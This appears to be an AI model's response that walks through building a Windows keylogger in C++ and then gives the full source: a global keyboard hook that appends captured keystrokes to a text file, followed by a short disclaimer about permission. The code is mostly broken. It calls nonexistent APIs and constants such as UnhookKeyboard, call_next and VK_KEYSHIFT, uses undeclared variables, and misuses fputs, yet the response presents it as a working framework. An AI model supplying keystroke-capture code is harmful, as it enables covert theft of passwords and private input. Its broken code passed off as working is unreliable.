1. **Include Necessary Headers:**
   - Include `windows.h` and `Winuser.h` for Windows API functions.

2. **Define the Keyboard Hook Function:**
   - Create a function `KeyboardHookProc` that will handle keyboard events.

3. **Set Up the Keyboard Hook:**
   - Use `SetWindowsHook` with `WH_KEYBOARD_LL` to install a global keyboard hook.

4. **Initialize Variables:**
   - Declare a global variable `hookID` to store the hook ID.
   - Create a file pointer `file` to store keystrokes.

5. **File Handling:**
   - Open a file in append mode to log keystrokes. Use `fopen` with `' keystrokes.txt'` and ` mode append`.

6. **Loop to Capture Keystrokes:**
   - Use a `while` loop to continuously check for key states.
   - Use `GetKeyState` to check if a key is pressed (KEYDOWN) or released (KEYUP).

7. **Handle Key Presses:**
   - For each key, determine if it's a regular key or a modifier (Shift, Ctrl, Alt).
   - Append the key to the file with a timestamp using `fputs`.

8. **Remove the Hook:**
   - Use `UnhookKeyboard` with the `hookID` to remove the hook when done.

9. **Ensure Clean Shutdown:**
   - In the `WM_CLOSE` message handler, ensure the hook is removed and the file is closed properly.

### Code:

```cpp
#include <windows.h>
#include <Winuser.h>
#include <iostream>
#include <fstream>
using namespace std;

HHOOK KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
    static int lastKey = 0;
    static FILE *file = nullptr;
    static HWND hwnd = GetForegroundWindow();

    if (wParam == WM_KEYDOWN) {
        if (GetAsyncKeyState(VK_KEYSHIFT) && wParam != 0x20) {
            // Shift is pressed
            key = 'Shift';
        } else if (GetAsyncKeyState(VK_KEYCTRL)) {
            // Ctrl is pressed
            key = 'Ctrl';
        } else if (GetAsyncKeyState(VK_KEYALT)) {
            // Alt is pressed
            key = 'Alt';
        } else {
            // Regular key
            key = wParam;
        }
        // Check if key is a printable character
        if (IsKeyDown(wParam)) {
            if (file) {
                char ch = static_cast<char>(wParam);
                if (ch != 0) {
                    fputs(ch, file);
                    cout << ch << endl;
                }
            }
        }
    } else if (wParam == WM_KEYUP) {
        if (wParam == 0x20) {
            lastKey = 0;
        }
    }
    return call_next((int)wParam, lParam, wParam);
}

int main() {
    HWND hwnd = GetForegroundWindow();
    HHOOK hookID = SetWindowsHook(WH_KEYBOARD_LL, KeyboardHookProc);
    FILE *file = fopen("keystrokes.txt", "a");

    while (true) {
        Sleep(100);
        if (!file) {
            break;
        }
    }

    fclose(file);
    UnhookKeyboard(hookID);
    return 0;
}

// In your main window proc:
LRESULT CALLBACK WndProc(HWND hwnd, int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == WM_CLOSE) {
        // Ensure hook is removed
        static HHOOK hookID = 0;
        if (hookID) {
            UnhookKeyboard(hookID);
            hookID = 0;
        }
        DestroyWindow(hwnd);
        return 0;
    }
    return DefWindowProc(hwnd, nCode, wParam, lParam);
}
```

### Notes:

- **Ethical Considerations:** Ensure you have the permission of the user to monitor their keyboard. Unauthorized use can be illegal.
- **Performance:** The `Sleep(100)` ensures the loop doesn't interfere with other processes.
- **File Handling:** Handle file operations with care to avoid issues like file not found or disk full.
- **Modifiers:** The code checks for Shift, Ctrl, and Alt keys to handle different key combinations.
- **Error Handling:** Use try-except blocks when dealing with file operations to prevent crashes.

This code provides a basic framework for logging keystrokes. Always use it responsibly and within legal boundaries.<｜end▁of▁sentence｜>

